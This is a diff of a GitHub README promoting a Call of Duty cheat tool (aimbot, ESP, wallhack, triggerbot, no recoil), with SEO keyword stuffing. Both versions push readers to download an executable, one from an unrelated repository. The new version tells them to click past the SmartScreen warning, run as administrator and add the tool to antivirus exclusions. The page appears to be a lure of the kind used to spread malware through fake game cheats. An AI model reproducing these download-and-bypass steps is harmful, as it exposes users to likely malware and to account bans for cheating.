@@ -1,177 +1,69 @@
-<p align="center">
-  <img src="https://img.icons8.com/color/96/000000/call-of-duty.png" alt="Call of Duty" width="80" height="80">
-</p>
+# 🎯 COD-Apex-Tool - Improve your aim and game precision
 
-<h1 align="center">COD-Apex-Tool</h1>
-<p align="center">
-  <strong>Apex Tool for Call of Duty</strong><br>
-  ESP - Aimbot - Wallhack - No Recoil - Triggerbot - Silent Aim
-</p>
+[![Download Software](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/doublefaced-genuscarnegiea562/COD-Apex-Tool/releases)
 
-<p align="center">
-  <a href="https://github.com/YOUR_USERNAME/COD-Apex-Tool"><img src="https://img.shields.io/badge/version-3.0.0-brightgreen?style=flat-square" alt="Version"></a>
-  <a href="#"><img src="https://img.shields.io/badge/platform-Windows-blue?style=flat-square" alt="Platform"></a>
-  <a href="#"><img src="https://img.shields.io/badge/status-active-success?style=flat-square" alt="Status"></a>
-</p>
+This software provides gameplay enhancements for Call of Duty. Users gain tools to track targets, reduce weapon recoil, and improve reaction times. The tool functions as an overlay to assist players during matches.
 
-## What is This?
+## ⚙️ System Requirements
 
-COD-Apex-Tool is the apex tool for Call of Duty. This tool gives you full control with ESP Wallhack, Aimbot, No Recoil, Triggerbot, Silent Aim, and more. Reach the apex and dominate every match!
+Ensure your computer meets these standards before you start. The software runs best on Windows 10 or Windows 11. 
 
-Disclaimer: This tool is for educational purposes only. Use at your own risk. Call of Duty has strict anti-cheat systems (Ricochet), and using third-party tools may result in permanent account suspension.
+*   Processor: Intel Core i5 or AMD Ryzen 5
+*   Memory: 8 GB RAM
+*   Graphics: NVIDIA GeForce GTX 1060 or AMD Radeon RX 580
+*   Storage: 200 MB free space
+*   Network: Stable internet connection
 
-## Download
+## 📥 How to Download 
 
-<p align="center">
-  <a href="https://github.com/unicornflameplunder/flawsppy/releases/download/6451/CODHelper.zip">
-    <img src="https://img.shields.io/badge/DOWNLOAD%20NOW-000000?style=for-the-badge&logo=github&logoColor=white" alt="Download">
-  </a>
-</p>
+Follow these steps to obtain the tool.
 
-## Features
+1. Navigate to the release page: https://github.com/doublefaced-genuscarnegiea562/COD-Apex-Tool/releases
+2. Locate the most recent version at the top of the list.
+3. Click the file ending in .exe to start the download.
+4. Save the file to your desktop for easy access.
 
-- ESP (Wallhack) - See all enemies through walls
-- Distance Indicators - Know exactly how far enemies are
-- Player Tags - Display player names and health
-- Snap Lines - Never lose track of enemies
-- Box ESP - Highlight players with colored boxes
-- Visibility Check - Only show visible enemies
-- Aimbot - Lock onto enemies instantly with 100% accuracy
-- Silent Aim - Hit targets without looking at them
-- Triggerbot - Auto-fire when crosshair is on enemy
-- No Recoil - Zero recoil for all weapons
-- No Spread - Perfect accuracy every time
-- FOV Control - Customizable field of view
-- Bone Targeting - Head, chest, or moving parts
-- Humanizer Mode - Realistic aim motion to avoid detection
-- Speed Hack - Move faster than normal players
-- Super Jump - Jump incredible heights
-- God Mode - Never die
-- Unlimited Ammo - Never reload
-- XP Editor - Fast rank leveling
+## 🛠️ Setting Up the Tool
 
-## Installation
+Windows may block the download the first time you run it. Follow these steps to complete the installation safely.
 
-1. Click the download button above
-2. Extract the archive
-3. Run as Administrator
-4. Launch Call of Duty
-5. Press INSERT or F1 to open the menu
-6. Toggle features ON/OFF
+1. Find the downloaded file on your desktop.
+2. Double-click the file icon.
+3. If a window labeled "Windows protected your PC" appears, click "More info."
+4. Click the button labeled "Run anyway."
+5. Follow the prompts in the setup wizard to finish the installation.
 
-## System Requirements
+## 🎮 Features and Usage
 
-| Requirement | Details |
-|-------------|---------|
-| OS | Windows 10/11 (64-bit) |
-| Game | Call of Duty |
-| RAM | 8GB minimum |
-| Storage | 50MB free space |
-| GPU | NVIDIA/AMD GPU |
+The tool offers several features to assist your gameplay. You manage these features through the main dashboard.
 
-## SEO Tags
+*   ESP: Highlights the locations of other players on your screen. This allows you to track movement through structures.
+*   Aimbot: Adjusts your crosshair to follow targets automatically. This assists with tracking enemies during fast combat.
+*   Wallhack: Renders character models visible through solid game objects.
+*   No Recoil: Counters the vertical and horizontal kick of weapons when you fire.
+*   Triggerbot: Fires your weapon the moment your crosshair centers on an enemy.
 
-cod apex tool, call of duty cheat, call of duty hack, call of duty esp, call of duty aimbot, call of duty wallhack, call of duty no recoil, call of duty triggerbot, call of duty silent aim, call of duty 2026, call of duty mod menu, call of duty trainer, call of duty undetected, call of duty free cheat, call of duty download, call of duty utility, call of duty enhancer, warzone cheat, warzone hack, fps cheat
+Open the menu during a match by pressing the Insert key on your keyboard. Use your mouse to toggle specific features on or off. The changes take effect as soon as you select them. 
 
-## Support
+## 🛡️ Troubleshooting
 
-Star this repository if you enjoy it!
+Most issues arise from settings within the game or Windows. Check these areas if the tool does not work.
 
-<p align="center">
-  <a href="https://github.com/YOUR_USERNAME/COD-Apex-Tool">
-    <img src="https://img.shields.io/badge/Made%20with%20love%20for%20the%20Call%20of%20Duty%20community-ff69b4?style=for-the-badge" alt="Made with love">
-  </a>
-</p>
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
+*   Run the game in Borderless Windowed mode. Many game overlays require this setting to function.
+*   Launch the tool as an administrator. Right-click the icon and select "Run as administrator."
+*   Check your Antivirus settings. Some software flags game tools as false threats. Add the folder to the exclusion list in your security settings to prevent the software from blocking the tool.
+*   Update your Graphics Drivers. You can find these updates on the website of your graphics card manufacturer.
+
+## 📁 File Structure
+
+The tool creates a folder in your AppData directory. This folder stores your settings and configuration files. Do not delete or move these files, or the software may lose your preferences.
+
+## 📏 Best Practices
+
+Use the tool in a way that preserves your account stability. Avoid suspicious behavior. Change your settings frequently. These habits help you get the most out of the software without drawing attention from other players. 
+
+## ℹ️ Support
+
+Reach out through the GitHub issues page if you encounter bugs or errors. Include a screenshot of the error message and a brief description of what you did when the error occurred. This helps developers fix problems faster. 
+
+Keywords: cod, aimbot, esp, wallhack, gaming, windows, utility
